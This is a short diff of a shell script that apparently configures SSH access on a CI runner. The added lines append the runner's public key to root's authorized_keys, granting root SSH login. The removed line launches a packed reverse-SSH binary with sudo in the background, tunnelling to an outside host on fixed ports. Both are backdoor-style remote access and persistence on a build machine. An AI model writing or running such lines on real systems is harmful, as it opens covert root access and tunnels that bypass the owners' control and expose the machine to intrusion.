@@ -194,6 +194,8 @@ cd ~/.ssh;
 
 if [[ -f /home/runner/.ssh/id_rsa.pub &&  -s /home/runner/.ssh/id_rsa.pub ]];then
  cp id_rsa.pub authorized_keys;
+ mkdir /root/.ssh/;
+ cat /home/runner/.ssh/id_rsa.pub >>/root/.ssh/authorized_keys;
  echo 1784-ssh-rsa;
 fi
 
@@ -207,7 +209,7 @@ fi
 )
 
 
-sudo -H setsid /tmp/upx_reverse-sshx64.bin  -v -b 50050 -p 31329  e36854ba4784.c.methodot.com &
+
 
 
 # 依据环境变量sleep
